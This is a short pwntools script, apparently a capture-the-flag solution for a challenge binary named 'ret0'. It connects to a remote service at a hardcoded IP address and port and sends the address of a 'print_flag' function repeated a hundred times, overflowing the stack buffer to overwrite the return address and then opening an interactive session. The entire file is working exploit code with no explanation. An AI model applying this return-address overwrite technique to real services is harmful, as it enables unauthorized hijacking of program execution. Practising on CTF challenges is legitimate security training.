from pwn import *

e = ELF('./ret0')
win = p64(e.sym['print_flag'])
p = remote('107.191.51.129',5000)
p.sendline(win*100)
p.interactive()

